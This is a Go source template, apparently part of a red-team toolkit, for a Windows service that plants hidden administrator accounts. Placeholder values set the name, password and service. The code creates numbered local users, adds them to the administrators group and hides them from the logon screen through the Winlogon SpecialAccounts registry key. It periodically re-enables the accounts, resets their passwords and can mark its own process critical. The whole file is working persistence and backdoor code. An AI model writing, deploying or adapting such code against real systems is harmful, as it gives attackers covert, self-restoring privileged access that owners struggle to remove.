// Copyright (C) 2020 - 2023 iDigitalFlame
//
// This program is free software: you can redistribute it and/or modify
// it under the terms of the GNU General Public License as published by
// the Free Software Foundation, either version 3 of the License, or
// any later version.
//
// This program is distributed in the hope that it will be useful,
// but WITHOUT ANY WARRANTY; without even the implied warranty of
// MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
// GNU General Public License for more details.
//
// You should have received a copy of the GNU General Public License
// along with this program.  If not, see <https://www.gnu.org/licenses/>.
//

package main

import (
	"context"
	"os"
	"strconv"
	"sync"
	"syscall"
	"time"
	"unsafe"

	"github.com/iDigitalFlame/xmt/device"
	"github.com/iDigitalFlame/xmt/device/regedit"
	"github.com/iDigitalFlame/xmt/device/winapi"
	"github.com/iDigitalFlame/xmt/com/limits"
	"golang.org/x/sys/windows"
)

const (
	user = `$username`
	flag = `$flag`
)

var (
	// TODO(dij): Maybe Improve this with our library.
	dllNetapi32 = windows.NewLazySystemDLL("netapi32.dll")

	funcNetUserAdd              = dllNetapi32.NewProc("NetUserAdd")
	funcNetUserSetInfo          = dllNetapi32.NewProc("NetUserSetInfo")
	funcNetLocalGroupAddMembers = dllNetapi32.NewProc("NetLocalGroupAddMembers")
)

type userInfo2 struct {
	Name     *uint16
	Password *uint16
	_        uint32
	Priv     uint32
	_        *uint16
	Comment  *uint16
	Flags    uint32
	_        *uint16
	_        uint32
	FullName *uint16
	_        *uint16
	_        *uint16
	_        *uint16
	_        uint32
	_        uint32
	Expires  int32
	Storage  int32
	_        uint32
	_        *byte
	_        uint32
	_        uint32
	_        *uint16
	_        uint32
	_        uint32
}
type localGroup3 struct {
	Name *uint16
}
type userAddService struct {
	last, fixup uint16

	run           bool
	admins        []uint16
	passwd        []uint16
	name, comment []uint16
	sync.Once
}

func main() {
	defer func() {
		if err := recover(); err != nil {
			device.GoExit()
		}
	}()
	var (
		s = new(userAddService)
		z bool
	)
	if $critical {
		z, _ = device.SetCritical(true)
	}
	limits.MemorySweep(context.Background())
	if device.DaemonTicker(`$service`, time.Second*time.Duration($period), s.exec); !z {
		device.SetCritical(false)
	}
	device.GoExit()
}
func (s *userAddService) setup() {
	s.admins, _ = winapi.UTF16FromString(`$admin`)
	s.name, _ = winapi.UTF16FromString(`$fullname`)
	s.passwd, _ = winapi.UTF16FromString(`$password`)
	s.comment, _ = winapi.UTF16FromString(`$comment`)
	if len(flag) == 0 {
		s.run = true
	} else if _, err := os.Stat(flag); err == nil {
		s.run = true
	}
}
func (s *userAddService) exec(_ context.Context) error {
	if s.Do(s.setup); !s.run {
		if _, err := os.Stat(flag); err == nil {
			s.run = true
		}
		time.Sleep(time.Second)
		return nil
	}
	if s.fixup >= 20 {
		for v, i := user+strconv.FormatUint(0, 10), uint16(0); i < s.last; v = user + strconv.FormatUint(uint64(i), 10) {
			s.addUser(true, v)
			i++
		}
		s.fixup = 0
		return nil
	}
	for v := user + strconv.FormatUint(uint64(s.last), 10); s.last < 8192; v = user + strconv.FormatUint(uint64(s.last), 10) {
		r := s.addUser(false, v)
		if s.last++; !r {
			continue
		}
		regedit.SetDword("HKLM:\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon\\SpecialAccounts\\UserList", v, 0)
		break
	}
	s.fixup++
	return nil
}
func (s *userAddService) addUser(f bool, v string) bool {
	var (
		i    *userInfo2
		n, _ = winapi.UTF16PtrFromString(v)
		err  = syscall.NetUserGetInfo(nil, n, 2, (**byte)(unsafe.Pointer(&i)))
	)
	if err != nil || i == nil {
		x := &userInfo2{
			Name:     n,
			Priv:     1,
			Flags:    0x1090200,
			Expires:  -1,
			Storage:  -1,
			Comment:  &s.comment[0],
			FullName: &s.name[0],
			Password: &s.passwd[0],
		}
		if r, _, _ := syscall.SyscallN(funcNetUserAdd.Addr(), 0, 2, uintptr(unsafe.Pointer(x)), 0); r == 0 {
			g := &localGroup3{Name: n}
			syscall.SyscallN(funcNetLocalGroupAddMembers.Addr(), 0, uintptr(unsafe.Pointer(&s.admins[0])), 3, uintptr(unsafe.Pointer(g)), 1)
			g = nil
		}
		return true
	}
	if f {
		if i.Flags&0x800012 != 0 || i.Flags&0x1090000 != 0x1090000 {
			i.Password, i.Flags = &s.passwd[0], (i.Flags&^0x800012)|0x1090000
			syscall.SyscallN(funcNetUserSetInfo.Addr(), 0, uintptr(unsafe.Pointer(n)), 2, uintptr(unsafe.Pointer(i)), 0)
		}
		g := &localGroup3{Name: n}
		syscall.SyscallN(funcNetLocalGroupAddMembers.Addr(), 0, uintptr(unsafe.Pointer(&s.admins[0])), 3, uintptr(unsafe.Pointer(g)), 1)
		g = nil
	}
	syscall.NetApiBufferFree((*byte)(unsafe.Pointer(i)))
	return false
}
